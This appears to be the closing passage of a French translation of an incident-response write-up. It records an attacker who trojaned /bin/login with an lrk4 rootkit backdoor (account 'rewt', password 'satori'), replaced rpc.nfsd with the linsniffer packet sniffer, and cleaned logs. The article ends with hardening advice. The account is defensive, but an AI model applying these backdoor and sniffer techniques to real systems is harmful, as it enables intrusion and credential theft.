<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rwxr-xr-x root<span style="mso-spacerun:
yes">        </span>14140 Jun 30 14:56:36 1998 /usr/sbin/tcpd <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: drwxr-xr-x root<span style="mso-spacerun:
yes">         </span>2048 Apr<span style="mso-spacerun: yes">  </span>4
16:52:55 1999 /sbin <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rwxr-xr-x root<span style="mso-spacerun:
yes">        </span>19840 Jul<span style="mso-spacerun: yes">  </span>9
17:56:10 1998 /sbin/ifconfig <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>changed: -rw-r--r-- root<span style="mso-spacerun:
yes">          </span>649 Apr 27 16:59:54 1999 /etc/passwd <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Comme vous pouvez le voir plusieurs exécutables et
fichiers ont été modifié. Il n'y avait aucune nouvelle entrée dans /etc/passwd
(il avait prudemment enlevé les comptes de crak0 et de rewt) donc notre hacker
avait du laisser une backdoor dans un des exécutables modifiés. En outre, deux
fichiers avaient été ajoutés, /usr/sbin/sniff.pid et /usr/sbin/tcp.log. Sans
surprise /usr/sbin/sniff.pid était le pid du sniffer et /usr/sbin/tcp.log était
où il stockait toutes les informations capturées. Se basant sur
/usr/sbin/sniff.pid, le sniffer s'est avéré être rpc.nfsd. Notre hacker avait
compilé un sniffer, ici linsniffer, et remplaça rpc.nfsd par celui-ci. Cela lui
assurait que si le système était rebooté, le sniffer redémarrait le processus
d'initialisation. Les lignes suivantes confirment que rpc.nfsd est le sniffer:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>mozart #strings /usr/sbin/rpc.nfsd | tail -15 <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>cant get SOCK_PACKET socket <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>cant get flags <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>cant set promiscuous mode <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>----- [CAPLEN Exceeded] <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>----- [Timed Out] <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>----- [RST] <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>----- [FIN] <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>%s =&gt; <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>%s [%d] <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>sniff.pid <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>eth0 <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>tcp.log <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>cant open log <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>rm %s <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Après avoir passé en revue le système et compris ce
qui s'était passé, je quittai le système. J'étais curieux de savoir ce que
ferait le hacker après. Je n'ai pas voulu qu'il sût que je l'avais attrapé,
ainsi j'ai enlevé toutes mes entrées de /usr/sbin/tcp.log.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span lang=FR
style='font-family:Arial'>Les suites du script kiddie<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Notre hacker revint le jour suivant. En sauvant ses
frappes au clavier, je pus rapidement identifier la backdoor, /bin/login étais
infectée par un trojan. Cet exécutable utilisé pour les connections telnet
était configuré pour donner au compte &quot;rewt&quot; les privilèges root avec
le mot de passe &quot;satori&quot;. Le mot de passe &quot;satori &quot; est le
mot de passe par défaut pour tous les exécutables trojaned<span
style="mso-spacerun: yes">  </span>que le rootkit lrk4 utilise, une information
radicale pour savoir si votre système a été compromis.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Le hacker vérifiait son sniffer pour s'assurer qu'il
fonctionnait toujours. En outre, il voulait voir si un compte avait été capturé
depuis la veille. Vous pouvez voir ses frappes au clavier sur
&quot;keystrokes.txt&quot;. Remarquez qu'à la fin du log notre hacker fit un
kill sur le sniffer. Ce fut la dernière chose qu'il fit avant de finir sa
session. Cependant, il revint rapidement après quelques minutes avec une autre
session juste pour redémarrer le sniffer. Je ne sais pas vraiment pourquoi il
fit cela.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Cette histoire de vérification du système continua
encore plusieurs jours. Chaque jour le hacker voulait se connecter au
système<span style="mso-spacerun: yes">  </span>pour voir si le sniffer
fonctionnait et s’il avait pris des données intéressantes. Après le quatrième
jour, j'en eus assez et déconnectai le système. J'avais appris assez des
actions du hackeur et n'allais rien apprendre de nouveau.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span lang=FR
style='font-family:Arial'>Conclusion<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-family:Arial'>Nous avons vu dans cet article comment un hacker peut
agir, du début à la fin, une fois qu'il est devenu root sur votre système. Ils
commencent souvent par vérifier si quelqu'un est sur le système. Une fois
qu'ils savent que la voie est libre, ils dissimulent leurs traces en nettoyant
les fichiers logs et en remplaçant ou en modifiant des dossiers
importants.<span style="mso-spacerun: yes">  </span>Une fois qu'ils sont cachés
de manière sure, ils passent à de nouvelles et plus préjudiciables activités.
Leur tactique est de rester, vu que les nouveaux exploits sont constamment
découverts. Pour mieux se protéger contre ces menaces, je vous recommande de
sécuriser vos ordinateurs. Une sécurité de base vous protégera contre la menace
de la plupart des script kiddies, contre le fait qu'ils forcent un système sans
trop de problèmes. Pour se faire une idée sur la façon de sécuriser votre
système, allez voir &quot;Armoring Linux&quot; ou &quot;Armoring Solaris&quot;.<span
style="mso-spacerun: yes">  </span>S' il est trop tard et que vous pensez
que<span style="mso-spacerun: yes">  </span>votre système a<span
style="mso-spacerun: yes">  </span>déjà été compromis, un bon départ est le
site du CERT &quot;Recovering from an Incident&quot; .</span></p>

</div>

</body>

</html>
